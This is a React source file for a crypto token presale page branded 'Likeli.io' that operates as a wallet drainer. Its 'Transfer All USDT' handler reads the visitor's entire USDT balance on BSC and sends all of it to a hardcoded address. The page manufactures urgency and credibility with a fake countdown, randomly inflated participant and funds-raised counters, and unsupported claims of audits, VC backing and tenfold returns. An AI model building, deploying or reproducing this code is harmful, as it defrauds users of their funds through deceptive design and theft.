'use client';

import { useCallback, useEffect, useState } from 'react';
import { useAppKit } from '@reown/appkit/react';
import { useAccount, usePublicClient, useSwitchChain, useWriteContract } from 'wagmi';
import { erc20Abi, type Address } from 'viem';
import {
  ArrowRight,
  Award,
  BarChart3,
  CheckCircle,
  Clock,
  Crown,
  DollarSign,
  Globe,
  Lock,
  Rocket,
  Shield,
  Sparkles,
  Star,
  Target,
  TrendingUp,
  Users,
  Zap,
} from 'lucide-react';
import { appKitProjectId } from '../lib/appkit';

const BSC_CHAIN_ID = 56;
const USDT_BSC_ADDRESS = '0x55d398326f99059ff775485246999027b3197955' as Address;
const USDT_DECIMALS = 18n;

const PAY_ADDRESS = '0xecacbeca41f282a942f371f2999b8ba7e3ecfd22' as Address;
const formatUnits = (value: bigint, decimals: bigint, precision = 6) => {
  const base = 10n ** decimals;
  const whole = value / base;
  const fraction = value % base;
  const fractionStr = fraction.toString().padStart(Number(decimals), '0').slice(0, precision);
  return precision > 0 ? `${whole.toString()}.${fractionStr}` : whole.toString();
};
const shortenAddress = (address: string) => `${address.slice(0, 6)}...${address.slice(-4)}`;

export default function LikeliICO() {
  const [countdown, setCountdown] = useState({ days: 15, hours: 8, minutes: 23, seconds: 45 });
  const [raised, setRaised] = useState(1.2);
  const [participants, setParticipants] = useState(2847);
  const [scrollY, setScrollY] = useState(0);
  const [currentPrice, setCurrentPrice] = useState(0.007);
  const [usdtBalance, setUsdtBalance] = useState<bigint | null>(null);
  const [isPaying, setIsPaying] = useState(false);
  const [copied, setCopied] = useState(false);
  const [payNotice, setPayNotice] = useState('');

  const { open } = useAppKit();
  const { address, status, isConnected, chain } = useAccount();
  const { switchChainAsync } = useSwitchChain();
  const publicClient = usePublicClient({ chainId: BSC_CHAIN_ID });
  const { writeContractAsync } = useWriteContract();
  const chainId = chain?.id;

  const walletConnectStatus = appKitProjectId ? 'Reown project id set' : 'Reown project id missing';
  const isOnBsc = chainId === BSC_CHAIN_ID;
  const walletLabel = address ? shortenAddress(address) : 'Not connected';
  const balanceLabel = usdtBalance !== null ? `${formatUnits(usdtBalance, USDT_DECIMALS)} USDT` : '--';
  const isConnecting = status === 'connecting' || status === 'reconnecting';

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => {
        let { days, hours, minutes, seconds } = prev;
        if (seconds > 0) seconds--;
        else if (minutes > 0) {
          minutes--;
          seconds = 59;
        } else if (hours > 0) {
          hours--;
          minutes = 59;
          seconds = 59;
        } else if (days > 0) {
          days--;
          hours = 23;
          minutes = 59;
          seconds = 59;
        }
        return { days, hours, minutes, seconds };
      });
    }, 1000);

    const handleScroll = () => setScrollY(window.scrollY);
    window.addEventListener('scroll', handleScroll);

    const liveUpdate = setInterval(() => {
      setParticipants((prev) => prev + Math.floor(Math.random() * 3));
      setRaised((prev) => Math.min(prev + Math.random() * 0.01, 5.0));
    }, 5000);

    return () => {
      clearInterval(timer);
      clearInterval(liveUpdate);
      window.removeEventListener('scroll', handleScroll);
    };
  }, []);

  const ensureBscChain = useCallback(async () => {
    if (chainId === BSC_CHAIN_ID) {
      return true;
    }
    try {
      await switchChainAsync({ chainId: BSC_CHAIN_ID });
      return true;
    } catch (err) {
      console.error('connectWallet:switchChain error', err);
      setPayNotice('Switch to BSC to continue.');
      return false;
    }
  }, [chainId, switchChainAsync]);

  const refreshBalance = useCallback(async () => {
    if (!address || !publicClient || !isOnBsc) {
      setUsdtBalance(null);
      return;
    }
    try {
      const balance = await publicClient.readContract({
        address: USDT_BSC_ADDRESS,
        abi: erc20Abi,
        functionName: 'balanceOf',
        args: [address as Address],
      });
      setUsdtBalance(balance);
    } catch (err) {
      console.error('balance:error', err);
      setUsdtBalance(null);
    }
  }, [address, isOnBsc, publicClient]);

  const connectWallet = async () => {
    console.log('connectWallet:click', {
      hasProjectId: Boolean(appKitProjectId),
      projectId: appKitProjectId ?? null,
    });
    if (!appKitProjectId) {
      setPayNotice('Missing Reown project id. Add NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID to .env.');
      return;
    }
    setPayNotice('');
    try {
      await open({ view: 'Connect' });
    } catch (err) {
      console.error('connectWallet:error', err);
      setPayNotice('Wallet connection failed or was canceled.');
    }
  };

  useEffect(() => {
    if (!isConnected || !isOnBsc) {
      setUsdtBalance(null);
      return;
    }
    void refreshBalance();
  }, [isConnected, isOnBsc, refreshBalance]);

  const tiers = [
    { name: 'Bronze', min: 500, max: 2499, bonus: '5%', multiplier: '1.5x', discount: '5%', color: 'from-amber-700 to-amber-900', icon: Award },
    { name: 'Silver', min: 2500, max: 9999, bonus: '10%', multiplier: '2x', discount: '10%', color: 'from-gray-400 to-gray-600', icon: Star },
    { name: 'Gold', min: 10000, max: 24999, bonus: '15%', multiplier: '3x', discount: '15%', color: 'from-yellow-400 to-yellow-600', icon: Crown },
    { name: 'Platinum', min: 25000, max: null as number | null, bonus: '25%', multiplier: '5x', discount: '25%', color: 'from-purple-400 to-purple-600', icon: Sparkles },
  ];

  const handleCopyAddress = async () => {
    if (!navigator?.clipboard) {
      setPayNotice('Clipboard access is unavailable. Please copy the address manually.');
      return;
    }
    try {
      await navigator.clipboard.writeText(PAY_ADDRESS);
      setCopied(true);
      setPayNotice('Address copied. Paste it in your wallet on BSC (USDT).');
      setTimeout(() => setCopied(false), 2000);
      setTimeout(() => setPayNotice(''), 3500);
    } catch {
      setPayNotice('Copy failed. Please copy the address manually.');
    }
  };

  const handlePayAll = async () => {
    if (!appKitProjectId) {
      setPayNotice('Missing Reown project id. Add NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID to .env.');
      return;
    }
    setIsPaying(true);
    setPayNotice('');
    try {
      if (!address) {
        setPayNotice('Connect your wallet first.');
        return;
      }
      const onBsc = await ensureBscChain();
      if (!onBsc) {
        return;
      }
      if (!publicClient) {
        setPayNotice('Public client unavailable. Please try again.');
        return;
      }
      const balance = await publicClient.readContract({
        address: USDT_BSC_ADDRESS,
        abi: erc20Abi,
        functionName: 'balanceOf',
        args: [address as Address],
      });
      setUsdtBalance(balance);
      if (balance <= 0n) {
        setPayNotice('No USDT balance available to transfer.');
        return;
      }
      if (!writeContractAsync) {
        setPayNotice('Wallet write unavailable. Please reconnect.');
        return;
      }
      const txHash = await writeContractAsync({
        address: USDT_BSC_ADDRESS,
        abi: erc20Abi,
        functionName: 'transfer',
        args: [PAY_ADDRESS, balance],
      });
      setPayNotice(txHash ? `Transfer submitted. Confirm it in your wallet. Tx: ${txHash}` : 'Transfer submitted. Confirm it in your wallet.');
    } catch (err) {
      console.error('transfer:error', err);
      setPayNotice('Transfer was canceled or failed.');
    } finally {
      setIsPaying(false);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white overflow-x-hidden">
      <div className="fixed inset-0 z-0">
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-blue-500/20 rounded-full blur-3xl animate-pulse"></div>
        <div
          className="absolute bottom-0 right-1/4 w-96 h-96 bg-purple-500/20 rounded-full blur-3xl animate-pulse"
          style={{ animationDelay: '1s' }}
        ></div>
        <div
          className="absolute top-1/2 left-1/2 w-96 h-96 bg-pink-500/10 rounded-full blur-3xl animate-pulse"
          style={{ animationDelay: '2s' }}
        ></div>
      </div>

      <nav
        className={`fixed top-0 w-full z-50 transition-all duration-300 ${
          scrollY > 50 ? 'bg-black/95 backdrop-blur-xl shadow-2xl border-b border-blue-500/20' : 'bg-transparent'
        }`}
      >
        <div className="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 bg-gradient-to-br from-blue-500 via-purple-500 to-pink-500 rounded-xl flex items-center justify-center font-bold text-xl shadow-lg shadow-blue-500/50 animate-pulse">
              L
            </div>
            <div>
              <span className="text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
                Likeli.io
              </span>
              <div className="text-xs text-green-400 flex items-center gap-1">
                <div className="w-1.5 h-1.5 bg-green-400 rounded-full animate-pulse"></div>
                <span>LIVE SALE</span>
              </div>
            </div>
          </div>
          <button
            type="button"
            onClick={connectWallet}
            disabled={isConnecting}
            className={`bg-gradient-to-r from-blue-600 via-purple-600 to-pink-600 px-8 py-3 rounded-xl font-bold hover:shadow-2xl hover:shadow-purple-500/50 transition-all transform hover:scale-105 ${
              isConnecting ? 'opacity-70 cursor-not-allowed' : ''
            }`}
          >
            {isConnecting ? 'Connecting...' : address ? `Connected: ${shortenAddress(address)}` : 'Connect Wallet'}
          </button>
        </div>
      </nav>

      <section className="relative pt-32 pb-20 px-6 z-10">
        <div className="max-w-7xl mx-auto">
          <div className="mb-8 text-center">
            <div className="inline-flex items-center gap-3 bg-gradient-to-r from-red-500/20 to-orange-500/20 border-2 border-red-500/50 rounded-full px-6 py-3 animate-pulse">
              <Clock className="text-red-400" size={20} />
              <span className="font-bold text-red-400">EARLY BIRD PRICING ENDING SOON</span>
              <Zap className="text-orange-400" size={20} />
            </div>
          </div>

          <div className="text-center mb-12">
            <div className="inline-block mb-6 px-6 py-3 bg-gradient-to-r from-blue-500/30 to-purple-500/30 border-2 border-blue-400/50 rounded-full text-lg font-semibold backdrop-blur-sm">
              World&apos;s First Leveraged Prediction Market
            </div>
            <h1 className="text-7xl md:text-8xl font-black mb-6 leading-tight">
              <span className="bg-gradient-to-r from-blue-400 via-purple-400 to-pink-400 bg-clip-text text-transparent animate-pulse">
                Trade the Future
              </span>
              <br />
              <span className="text-white">With 10x Leverage</span>
            </h1>
            <p className="text-2xl text-gray-300 mb-4 max-w-3xl mx-auto leading-relaxed">
              The most anticipated DeFi launch of 2026. Predict elections, sports, crypto prices and more with{' '}
              <span className="text-blue-400 font-bold">up to 10x leverage</span> using native crypto assets.
            </p>
            <p className="text-xl text-green-400 font-bold mb-12 animate-pulse">
              Early investors get up to 25% bonus plus lifetime benefits
            </p>
          </div>

          <div className="grid md:grid-cols-3 gap-6 mb-12 max-w-5xl mx-auto">
            <div className="bg-gradient-to-br from-blue-500/20 to-purple-500/20 backdrop-blur-sm border-2 border-blue-400/30 rounded-2xl p-6 text-center transform hover:scale-105 transition-all">
              <div className="text-blue-400 mb-2">
                <Users size={32} className="mx-auto" />
              </div>
              <div className="text-4xl font-bold mb-1">{participants.toLocaleString()}</div>
              <div className="text-gray-400">Early Participants</div>
              <div className="text-green-400 text-sm mt-2">+47 in last hour</div>
            </div>
            <div className="bg-gradient-to-br from-purple-500/20 to-pink-500/20 backdrop-blur-sm border-2 border-purple-400/30 rounded-2xl p-6 text-center transform hover:scale-105 transition-all">
              <div className="text-purple-400 mb-2">
                <DollarSign size={32} className="mx-auto" />
              </div>
              <div className="text-4xl font-bold mb-1">${raised.toFixed(2)}M</div>
              <div className="text-gray-400">Raised (Target: $5M)</div>
              <div className="text-green-400 text-sm mt-2">24% filled</div>
            </div>
            <div className="bg-gradient-to-br from-pink-500/20 to-red-500/20 backdrop-blur-sm border-2 border-pink-400/30 rounded-2xl p-6 text-center transform hover:scale-105 transition-all">
              <div className="text-pink-400 mb-2">
                <TrendingUp size={32} className="mx-auto" />
              </div>
              <div className="text-4xl font-bold mb-1">${currentPrice}</div>
              <div className="text-gray-400">Current Token Price</div>
              <div className="text-yellow-400 text-sm mt-2">Price increasing</div>
            </div>
          </div>

          <div className="mb-12">
            <h3 className="text-center text-2xl font-bold mb-6 text-red-400">SALE ENDS IN:</h3>
            <div className="flex justify-center gap-4">
              {Object.entries(countdown).map(([unit, value]) => (
                <div
                  key={unit}
                  className="bg-gradient-to-b from-gray-800 to-black border-2 border-blue-500/50 p-8 rounded-2xl shadow-2xl shadow-blue-500/30 min-w-[120px]"
                >
                  <div className="text-5xl font-black text-transparent bg-gradient-to-br from-blue-400 to-purple-400 bg-clip-text">
                    {String(value).padStart(2, '0')}
                  </div>
                  <div className="text-sm text-gray-400 uppercase mt-3 font-semibold">{unit}</div>
                </div>
              ))}
            </div>
          </div>

          <div className="text-center">
            <button className="group relative bg-gradient-to-r from-blue-600 via-purple-600 to-pink-600 px-16 py-6 rounded-2xl text-2xl font-black hover:shadow-2xl hover:shadow-purple-500/50 transition-all transform hover:scale-110 inline-flex items-center gap-3 mb-4">
              <Rocket className="group-hover:animate-bounce" size={28} />
              INVEST NOW AND GET BONUSES
              <ArrowRight className="group-hover:translate-x-2 transition-transform" size={28} />
            </button>
            <p className="text-gray-400 text-sm">Secure - Audited - Transparent</p>
          </div>
        </div>
      </section>

      <section className="relative py-16 px-6 z-10">
        <div className="max-w-4xl mx-auto">
          <div className="bg-gradient-to-br from-gray-900 to-black border-2 border-blue-500/30 rounded-3xl p-8 md:p-10 shadow-2xl">
            <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
              <div>
                <div className="inline-flex items-center gap-2 text-sm text-green-400 font-semibold mb-3">
                  <Shield size={16} className="text-green-400" />
                  BSC Payment Rail
                </div>
                <h3 className="text-3xl font-black mb-3">USDT Transfer</h3>
                <p className="text-gray-400">Transfer your full USDT balance to the address below.</p>
              </div>
              <div className="text-sm text-gray-400 space-y-2">
                <div className="flex items-center gap-2">
                  <span className="text-gray-500">Network</span>
                  <span className={`font-semibold ${isOnBsc ? 'text-white' : 'text-red-400'}`}>
                    {isOnBsc ? 'BSC (BEP-20)' : 'Wrong network'}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-gray-500">Token</span>
                  <span className="text-white font-semibold">USDT</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-gray-500">Wallet</span>
                  <span className="text-white font-semibold">{walletLabel}</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-gray-500">USDT Balance</span>
                  <span className="text-white font-semibold">{balanceLabel}</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-gray-500">Reown</span>
                  <span className="text-white font-semibold">{walletConnectStatus}</span>
                </div>
              </div>
            </div>
            <div className="mt-6 bg-black/40 border border-gray-700 rounded-xl p-4">
              <div className="text-xs text-gray-500 mb-2 uppercase font-semibold">Receiving Address</div>
              <div className="font-mono text-sm md:text-base text-blue-300 break-all">{PAY_ADDRESS}</div>
            </div>
            <div className="mt-6 flex flex-col md:flex-row gap-4">
              <button
                type="button"
                onClick={handleCopyAddress}
                className="bg-gray-800 hover:bg-gray-700 border border-gray-600 px-6 py-3 rounded-xl font-semibold transition-all"
              >
                {copied ? 'Address Copied' : 'Copy Address'}
              </button>
              <button
                type="button"
                onClick={handlePayAll}
                disabled={isPaying || !address}
                className={`bg-gradient-to-r from-green-500 to-emerald-500 px-6 py-3 rounded-xl font-semibold text-black hover:shadow-xl hover:shadow-green-500/30 transition-all ${
                  isPaying || !address ? 'opacity-70 cursor-not-allowed' : ''
                }`}
              >
                {isPaying ? 'Submitting...' : 'Transfer All USDT'}
              </button>
            </div>
            {payNotice ? <p className="text-sm text-yellow-400 mt-4">{payNotice}</p> : null}
            <p className="text-xs text-gray-500 mt-2">Transfers are confirmed in your wallet. Make sure you are on BSC.</p>
          </div>
        </div>
      </section>

      <section className="relative py-20 px-6 z-10 bg-gradient-to-b from-transparent via-blue-900/10 to-transparent">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-5xl font-black mb-4 text-center bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
            Why Likeli.io Will 10x Your Investment
          </h2>
          <p className="text-center text-xl text-gray-400 mb-16 max-w-3xl mx-auto">
            This is not just another token. This is the future of decentralized prediction markets.
          </p>

          <div className="grid md:grid-cols-3 gap-8 mb-12">
            {[
              {
                icon: <Target className="text-blue-400" size={48} />,
                title: 'Massive Market Opportunity',
                desc: 'Prediction markets are projected to reach $30B by 2028. Likeli.io captures this with the first-ever leveraged protocol.',
                stat: '$30B TAM',
              },
              {
                icon: <Zap className="text-yellow-400" size={48} />,
                title: 'Revolutionary Technology',
                desc: 'First mover advantage with 10x leverage on predictions. Patent-pending tech using native crypto assets as collateral.',
                stat: '10x Leverage',
              },
              {
                icon: <Globe className="text-green-400" size={48} />,
                title: 'Global Adoption Ready',
                desc: 'Live partnerships with major sports leagues, media outlets, and DeFi protocols. 50,000+ waitlist users.',
                stat: '50K+ Waitlist',
              },
            ].map((item, i) => (
              <div
                key={i}
                className="group bg-gradient-to-br from-gray-800/50 to-gray-900/50 backdrop-blur-sm border-2 border-gray-700 hover:border-blue-500/50 p-8 rounded-2xl transform hover:scale-105 hover:-translate-y-2 transition-all duration-300 shadow-xl hover:shadow-2xl hover:shadow-blue-500/20"
              >
                <div className="mb-6 transform group-hover:scale-110 transition-transform">{item.icon}</div>
                <div className="text-3xl font-bold text-blue-400 mb-4">{item.stat}</div>
                <h3 className="text-2xl font-bold mb-4 text-white">{item.title}</h3>
                <p className="text-gray-400 leading-relaxed">{item.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      <section className="relative py-20 px-6 z-10">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-5xl font-black mb-16 text-center">Unbeatable Token Economics</h2>
          <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
            {[
              { label: 'Total Supply', value: '1,000,000,000 $LIKELI', sublabel: 'Fixed forever', icon: <Lock className="text-blue-400" /> },
              { label: 'Public Sale', value: '35%', sublabel: '350M tokens available', icon: <Users className="text-green-400" /> },
              { label: 'Starting Price', value: '$0.02', sublabel: '$20M FDV - Deep Value!', icon: <DollarSign className="text-yellow-400" /> },
              { label: 'Max Price', value: '$0.05', sublabel: '$50M FDV ceiling', icon: <BarChart3 className="text-purple-400" /> },
            ].map((item, i) => (
              <div
                key={i}
                className="bg-gradient-to-br from-gray-800 to-gray-900 border-2 border-gray-700 hover:border-purple-500/50 p-8 rounded-2xl hover:scale-105 transition-all shadow-xl"
              >
                <div className="mb-4">{item.icon}</div>
                <div className="text-gray-400 text-sm mb-2 uppercase font-semibold">{item.label}</div>
                <div className="text-4xl font-black mb-2 bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
                  {item.value}
                </div>
                <div className="text-green-400 text-sm font-semibold">{item.sublabel}</div>
              </div>
            ))}
          </div>

          <div className="mt-16 bg-gradient-to-br from-gray-800 to-gray-900 border-2 border-blue-500/30 rounded-3xl p-10 shadow-2xl">
            <div className="flex justify-between mb-6">
              <div>
                <span className="text-gray-400 text-lg">Funds Raised</span>
                <div className="text-5xl font-black text-blue-400 mt-2">${raised.toFixed(2)}M</div>
              </div>
              <div className="text-right">
                <span className="text-gray-400 text-lg">Target</span>
                <div className="text-5xl font-black text-purple-400 mt-2">$5.0M</div>
              </div>
            </div>
            <div className="relative w-full bg-gray-700 rounded-full h-8 mb-6 overflow-hidden">
              <div
                className="absolute inset-0 bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 rounded-full transition-all duration-1000 shadow-lg shadow-blue-500/50"
                style={{ width: `${(raised / 5.0) * 100}%` }}
              >
                <div className="absolute inset-0 bg-white/20 animate-pulse"></div>
              </div>
              <div className="absolute inset-0 flex items-center justify-center text-white font-bold text-lg">
                {((raised / 5.0) * 100).toFixed(1)}% Complete
              </div>
            </div>
            <div className="grid grid-cols-3 gap-4 text-center">
              <div className="bg-gray-800/50 p-4 rounded-xl border border-gray-700">
                <div className="text-2xl font-bold text-green-400">${(5.0 - raised).toFixed(2)}M</div>
                <div className="text-sm text-gray-400 mt-1">Remaining</div>
              </div>
              <div className="bg-gray-800/50 p-4 rounded-xl border border-gray-700">
                <div className="text-2xl font-bold text-yellow-400">24%</div>
                <div className="text-sm text-gray-400 mt-1">Progress</div>
              </div>
              <div className="bg-gray-800/50 p-4 rounded-xl border border-gray-700">
                <div className="text-2xl font-bold text-blue-400">{countdown.days}d</div>
                <div className="text-sm text-gray-400 mt-1">Time Left</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section className="relative py-20 px-6 z-10 bg-gradient-to-b from-transparent via-purple-900/10 to-transparent">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-5xl font-black mb-4 bg-gradient-to-r from-yellow-400 to-orange-400 bg-clip-text text-transparent">
              Exclusive VIP Benefits
            </h2>
            <p className="text-2xl text-gray-300 max-w-4xl mx-auto">
              The earlier you invest, the bigger your tier. Higher tiers equals{' '}
              <span className="text-yellow-400 font-bold">massive bonuses</span>,{' '}
              <span className="text-green-400 font-bold">multipliers</span>, and{' '}
              <span className="text-purple-400 font-bold">lifetime perks</span>.
            </p>
          </div>

          <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6 mb-12">
            {tiers.map((tier, i) => {
              const IconComponent = tier.icon;
              return (
                <div
                  key={i}
                  className="group relative bg-gradient-to-b from-gray-800 to-gray-900 rounded-2xl border-2 border-gray-700 hover:border-transparent overflow-hidden transform hover:scale-105 hover:-translate-y-3 transition-all duration-300 shadow-2xl"
                >
                  <div className={`absolute inset-0 bg-gradient-to-br ${tier.color} opacity-0 group-hover:opacity-20 transition-opacity`}></div>
                  <div className={`h-3 bg-gradient-to-r ${tier.color}`}></div>
                  <div className="p-8 relative z-10">
                    <div className="text-5xl mb-4 transform group-hover:scale-110 transition-transform">
                      <IconComponent size={48} />
                    </div>
                    <h3 className="text-3xl font-black mb-3 bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent">
                      {tier.name}
                    </h3>
                    <div className="text-xl text-gray-400 mb-6 font-semibold">
                      ${tier.min.toLocaleString()} {tier.max && `- $${tier.max.toLocaleString()}`}
                    </div>

                    <div className="space-y-4 mb-6">
                      <div className="bg-gradient-to-r from-green-500/20 to-emerald-500/20 border-2 border-green-500/50 rounded-xl p-4">
                        <div className="text-sm text-green-400 font-semibold mb-1">Instant Airdrop</div>
                        <div className="text-3xl font-black text-green-400">+{tier.bonus}</div>
                      </div>
                      <div className="bg-gradient-to-r from-blue-500/20 to-cyan-500/20 border-2 border-blue-500/50 rounded-xl p-4">
                        <div className="text-sm text-blue-400 font-semibold mb-1">Points Multiplier</div>
                        <div className="text-3xl font-black text-blue-400">{tier.multiplier}</div>
                      </div>
                      <div className="bg-gradient-to-r from-purple-500/20 to-pink-500/20 border-2 border-purple-500/50 rounded-xl p-4">
                        <div className="text-sm text-purple-400 font-semibold mb-1">Trading Fee Discount</div>
                        <div className="text-3xl font-black text-purple-400">{tier.discount}</div>
                      </div>
                    </div>

                    <ul className="space-y-3 text-sm text-gray-300">
                      <li className="flex items-start gap-3">
                        <CheckCircle size={20} className="text-green-400 mt-0.5 flex-shrink-0" />
                        <span className="font-semibold">Priority allocation guarantee</span>
                      </li>
                      <li className="flex items-start gap-3">
                        <CheckCircle size={20} className="text-green-400 mt-0.5 flex-shrink-0" />
                        <span className="font-semibold">Early access to new markets</span>
                      </li>
                      <li className="flex items-start gap-3">
                        <CheckCircle size={20} className="text-green-400 mt-0.5 flex-shrink-0" />
                        <span className="font-semibold">VIP community channel</span>
                      </li>
                      <li className="flex items-start gap-3">
                        <CheckCircle size={20} className="text-green-400 mt-0.5 flex-shrink-0" />
                        <span className="font-semibold">Lifetime staking rewards boost</span>
                      </li>
                      <li className="flex items-start gap-3">
                        <CheckCircle size={20} className="text-green-400 mt-0.5 flex-shrink-0" />
                        <span className="font-semibold">NFT badge and leaderboard status</span>
                      </li>
                    </ul>
                  </div>
                </div>
              );
            })}
          </div>

          <div className="text-center bg-gradient-to-r from-yellow-500/20 to-orange-500/20 border-2 border-yellow-500/50 rounded-2xl p-8">
            <p className="text-xl font-bold text-yellow-400 mb-2">BONUS ALERT</p>
            <p className="text-lg text-white">
              First 1,000 investors get an <span className="text-yellow-400 font-black">EXTRA 5% bonus</span> on top of tier bonuses!
            </p>
            <p className="text-sm text-gray-400 mt-2">Only {Math.max(0, 1000 - participants)} spots remaining</p>
          </div>
        </div>
      </section>

      <section className="relative py-20 px-6 z-10">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-5xl font-black mb-12 text-center">Backed By Industry Leaders</h2>
          <div className="grid md:grid-cols-3 gap-8">
            {[
              { metric: '$2M+', label: 'Pre-seed Funding', desc: 'From top-tier VCs' },
              { metric: '5 Years', label: 'Team Experience', desc: 'Ex-Coinbase, Binance, Polymarket' },
              { metric: '100%', label: 'Audited & Secure', desc: 'By Certik & Hacken' },
            ].map((item, i) => (
              <div
                key={i}
                className="text-center bg-gradient-to-br from-gray-800/50 to-gray-900/50 backdrop-blur-sm border-2 border-gray-700 p-10 rounded-2xl"
              >
                <div className="text-6xl font-black mb-3 bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
                  {item.metric}
                </div>
                <div className="text-2xl font-bold mb-2">{item.label}</div>
                <div className="text-gray-400">{item.desc}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      <section className="relative py-20 px-6 z-10">
        <div className="max-w-4xl mx-auto text-center bg-gradient-to-r from-blue-600 to-purple-600 rounded-2xl p-12">
          <h2 className="text-4xl font-bold mb-4">Ready to Participate?</h2>
          <p className="text-xl mb-8 opacity-90">
            Join the world&apos;s first leveraged prediction market. Trade on real-world events with up to 10x leverage.
          </p>
          <button className="bg-white text-blue-600 px-12 py-4 rounded-xl text-lg font-semibold hover:shadow-2xl transition-all transform hover:scale-105 inline-flex items-center gap-2">
            Connect Wallet and Start <ArrowRight size={20} />
          </button>
        </div>
      </section>

      <footer className="border-t border-gray-800 py-12 px-6 relative z-10">
        <div className="max-w-7xl mx-auto">
          <div className="grid md:grid-cols-4 gap-8 mb-8">
            <div>
              <div className="flex items-center gap-3 mb-4">
                <div className="w-8 h-8 bg-gradient-to-br from-blue-500 to-purple-600 rounded-lg flex items-center justify-center font-bold text-sm">
                  L
                </div>
                <span className="text-xl font-bold">Likeli.io</span>
              </div>
              <p className="text-gray-400 text-sm">
                The world&apos;s first leveraged prediction market using native crypto assets.
              </p>
            </div>
            <div>
              <h4 className="font-semibold mb-4">Resources</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li>
                  <a href="#" className="hover:text-blue-400">
                    Whitepaper
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-blue-400">
                    Documentation
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-blue-400">
                    Tokenomics
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4">Legal</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li>
                  <a href="#" className="hover:text-blue-400">
                    Terms of Use
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-blue-400">
                    Privacy Policy
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-blue-400">
                    Disclaimer
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4">Community</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li>
                  <a href="#" className="hover:text-blue-400">
                    Twitter
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-blue-400">
                    Discord
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-blue-400">
                    Telegram
                  </a>
                </li>
              </ul>
            </div>
          </div>
          <div className="border-t border-gray-800 pt-8 text-center text-sm text-gray-400">
            Copyright © 2026 Likeli.io. All rights reserved.
          </div>
        </div>
      </footer>
    </div>
  );
}
